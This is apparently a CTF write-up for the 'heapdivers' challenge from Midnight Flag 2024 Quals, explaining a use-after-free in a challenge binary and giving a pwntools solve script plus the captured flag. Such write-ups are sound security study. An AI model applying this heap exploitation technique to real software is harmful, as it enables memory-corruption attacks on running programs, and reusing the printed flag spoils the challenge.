---
title: heapdivers - Midnight Flag 2024 Quals
slug: midnight-flag-2024-quals-heapdivers
authors: redacean
tags: [ midnight flag, heap, pwn, x86, use-after-free, linux ]
image: /img/midnight-flag.png
---

This heap challenge consists in exploiting a use-after-free vulnerability to call a _win_ function and print the flag.
It was part of the Midnight Flag 2024 Quals CTF which took place in April 2024.

<!-- truncate -->

The binary prompts the user for a character and different functions will be called depending on the character supplied.
After taking a look at what each function does, the pattern becomes clear:

1. enter _'s'_ to call the `earth` function and leak the address of the `plant_the_flag` function that prints the flag
2. enter _'e'_ to call the `eagle` function and make the heap size grow
3. enter _'x'_ to call the `extraction` function and free the function pointer
4. enter _'l'_ to call the `quasar` function and overwrite the value pointed to by the function pointer — which was just deallocated — with the address of the `plant_the_flag` function

The above steps yield the script below.

```python title="solve.py" showLineNumbers
from pwn import *

context.log_level = 'debug'
context.arch = 'x86'

io = process('./heapdivers')
# io = remote('13.38.208.179', 10583)

io.sendafter(b'[F]lee\n', b's\n')
io.recvuntil(b'Wow, Is this a memory leak ? 0x')
win_addr = io.recvline().strip()
win_addr = int(win_addr, 16)
print('Win function address: 0x%x' % win_addr)
print(p32(win_addr))

io.sendafter(b'[F]lee\n', b'e\n')
io.sendafter(b'Please announce your code name\n', b'A'*0x100 + b'\n')

io.sendafter(b'[F]lee\n', b'x\n')
io.sendafter(b'Do you really want to extract helldivers ?[Y/N]\n', b'y\n')

io.sendafter(b'[F]lee\n', b'l\n')
io.recvuntil(b'A word for the end ?\n')
io.sendline(p32(win_addr))

io.stream()
```

The remote process returns the flag `MCTF{R@1s3_Fl@g_0f_Sup3r_3arth}`.
